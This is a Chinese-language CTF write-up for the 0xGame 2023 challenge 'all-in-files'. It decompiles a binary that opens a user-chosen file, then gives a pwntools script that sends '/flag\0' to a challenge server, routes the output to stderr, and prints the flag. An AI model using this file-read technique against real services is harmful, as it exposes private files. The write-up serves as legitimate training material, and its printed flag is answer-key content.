---
title: 0xGame 2023 Writeup
date: 2023-10-19T19:38:23+08:00
draft: false
categories: [CTF]
tags: [CTF]
---

## Week 3

### all-in-files

> 一切皆文件是一种哲学

首先打开ida分析题目给的二进制文件。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  char v5[4]; // [rsp+8h] [rbp-8h] BYREF
  int fd; // [rsp+Ch] [rbp-4h]

  bufinit(argc, argv, envp);
  printf("Input filename to open: ");
  filename[(int)read(0, filename, 0x1FuLL)] = 0;
  printf("Input file id to read from: ");
  __isoc99_scanf("%d", v5);
  printf("Input file id to write to: ");
  __isoc99_scanf("%d", &v4);
  close(1);
  fd = open(filename, 0);
  if ( fd != -1 )
  {
    read(fd, &filebuf, 0x1FFuLL);
    write(v4, &filebuf, 0x1FFuLL);
    exit(0);
  }
  puts("Failed to open file!");
  return 0;
}
```

大致思路是读取`/flag`中的内容，然后输出到屏幕。注意到标准输出流（fd=1）被关闭了，可以用标准错误流（fd=2）代替。

```bash
Input filename to open: /flag
Input file id to read from: 3
Input file id to write to: 2

```

发现程序并没有返回任何内容。打开gdb进行调试，发现在读入`filename`的时候，读取的是`/flag\n`，最终`fd`的值为`-1`，推测是因为末尾的`\n`导致无法读取成功，最后因为标准输出流被关闭了，所以不会输出`Failed to open file!`提示用户。

使用`pwntools`来输入`/flag\0`，保证不会因为`\n`的原因而无法读取文件：

```python
from pwn import *

conn = remote("8.130.35.16", 53000)

conn.recvuntil(b"Input filename to open: ")
conn.sendline(b"/flag\0")
conn.recvuntil(b"Input file id to read from: ")
conn.sendline(b"3")
conn.recvuntil(b"Input file id to write to: ")
conn.sendline(b"2")
print(conn.recvline())

# 0xGame{A11_1s_files_H3R3_1n9d2h9c}
```

